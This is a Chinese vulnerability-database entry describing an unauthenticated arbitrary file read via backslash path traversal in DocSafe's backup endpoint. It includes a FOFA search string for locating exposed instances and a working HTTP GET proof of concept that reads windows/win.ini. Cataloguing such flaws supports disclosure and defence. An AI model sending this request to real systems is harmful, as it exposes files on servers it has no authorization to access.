---
source: "wy876 漏洞文库"
title: "DocSafe电子文档安全管理（疑济南上邦） backup反斜杠遍历读取"
product: "DocSafe电子文档安全管理（疑济南上邦）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未列，414指同产品V6.0需原始依据"
prerequisites: "只有GET路径，无身份信息"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ef5aearlcpog05ob"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fbackup%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"docsafe/docsafe.nocache.js\""
fofa_unverified: "body="
id: "vw-e165d1873e43dfd92dfa9237"
entity_id: "ve-e165d1873e43dfd92dfa9237"
schema_version: "1"
---

# DocSafe电子文档安全管理（疑济南上邦） backup反斜杠遍历读取

## 条目说明

- 对象与具体问题：DocSafe电子文档安全管理（疑济南上邦）；backup反斜杠遍历读取
- 版本、配置及部署条件：版本未列，414指同产品V6.0需原始依据
- 认证与权限前提：只有GET路径，无身份信息
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 应避免与亿赛通同泛名混并，414提供厂商线索保留
- 无响应/源码/修复，不能仅请求确认系统文件读取

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
电子文档安全管理系统backup存在任意文件读取漏洞，攻击者可通过该漏洞获取敏感信息。

## 二、影响版本
+ 电子文档安全管理系统

## 三、资产测绘
+ fofa`body="docsafe/docsafe.nocache.js"`
+ 特征


## 四、漏洞复现
```http
GET /resources/backup/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1
Host: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ef5aearlcpog05ob>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
